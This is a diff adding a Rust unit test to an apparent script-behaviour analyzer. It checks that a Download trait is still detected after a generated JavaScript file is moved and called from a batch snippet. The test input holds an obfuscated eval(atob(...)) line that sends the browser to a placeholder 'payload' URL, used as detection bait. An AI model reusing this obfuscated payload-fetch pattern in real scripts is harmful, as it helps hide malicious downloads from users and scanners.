@@ -13251,6 +13251,28 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn move_directory_destination_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS1kaXItanMuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+move /y original.js C:\Temp\
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://move-dir-js.example/payload"
+                )
+            }),
+            "move directory destination did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copy_b_multi_source_concat_tracked() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
